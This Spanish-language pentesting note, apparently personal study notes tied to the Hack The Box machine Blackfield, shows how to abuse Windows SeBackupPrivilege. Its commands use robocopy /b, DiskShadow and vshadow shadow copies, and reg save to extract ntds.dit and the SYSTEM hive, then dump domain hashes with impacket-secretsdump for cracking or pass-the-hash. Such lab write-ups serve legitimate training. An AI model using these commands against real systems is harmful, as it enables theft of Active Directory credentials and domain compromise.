
## DESCRIPTION

El privilegio SeBackupPrivilege te permite leer cualquier fichero del equipo "como si estuvieras haciendo un backup" aunque no tengas permisos para eso.

![[Pasted image 20230217141446.png]]

#### Mas información:
* https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#read-as-system

## EXPLOITATION

### OPTION 1: ROBOCOPY TO READ FILES

1. Simplemente hacemos la copia en una carpeta del equipo en la que podamos escribir.

```
robocopy /b <<Ruta que se quiere copiar>> <<Ruta destino>>

#Ejm:
robocopy /b C:\users\administrator\desktop C:\programdata\temp
```

![[Pasted image 20230216192104.png]]

**!!NOTA IMPORTANTE!!** Aquí lo prueba con otra movida que no es el robocopy: https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html

### OPTION 2: COPIAR BASE DE DATOS DE CONTRASEÑAS NTDS (AD)

**DiskShadow**

Podemos abusar de este privilegio para crear una copia de la base de datos de contraseñas del dominio (ntds.dit) que se encuentra en el siguiente directorio. Pero como el dispositivo lo tiene en uso entonces usamos el ataque conocido como DiskShadow.

Más información: https://pentestlab.blog/tag/diskshadow/

![[Pasted image 20230216203014.png]]

1.  Tenemos que crear un fichero con el siguiente contenido:

```
#NO USES ESTE MIRA MÁS ABAJO

set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
```

2.  Subimos el fichero a la máquina, en este ejemplo se ha usado WINRM

![[Pasted image 20230216210242.png]]

3. Lo ejecutamos con la utilidad de windows diskshadow.exe

```
diskshadow.exe /s diskshadow.txt
```

**!!NOTA IMPORTANTE!!** Ejecutarlo en una ruta con permiso de escritura si no no te va a hacer la copia de memoria. Por ejemplo ` C:\Temp

**!!NOTA IMPORTANTE!!**
	CUIDADO CON ESTA TONTERIA, POR QUE AL EJECUTARLO NOS DA ESTE ERROR:
	
	![[Pasted image 20230216210558.png]]

El muy cabron quita el ultimo caracter de cada fila del documento por lo tanto vamos a añadirle un espacio al final en diskshadow.txt:

```
set context persistent nowriters 
add volume c: alias someAlias 
create 
expose %someAlias% z: 
```

4. Ya funciona. Se ha creado una shadow copia de C: en Z:

![[Pasted image 20230216211137.png]]

5. Copiamos el fichero usando robocopy en `C:\Temp` de `Z:\Windows\ntds` y descargamos la base de datos ntds.dit

```
#Hacer copia a una carpeta que tengamos permisos

robocopy /b z:\windows\ntds\  C:\programdata\ ntds.dit

```

**!!NOTA IMPORTANTE!!** -> Si lo descargas directamente desde `Z:\Windows\ntds` a tu máquina da error a utilizar secretdumps.

![[Pasted image 20230217141821.png]]

6. Usamos impacket-secretdump para dumpear los hashes del dominio.

```
impacket-secretsdump -system system -ntds ntds.dit LOCAL
```

![[Pasted image 20230217140541.png]]
7. Si es un hash o bien lo crackeamos o hacemos pass the hash.


### OPTION 3: VSHADOW FOR NTDS.DIT

Descargar vshadow.exe: https://github.com/albertony/vss

```
vshadow.exe -nw -p  C:
```

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

```
reg.exe save hklm\system c:\system.bak
```

```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

## MACHINES

* Hack The Box: Blackfield
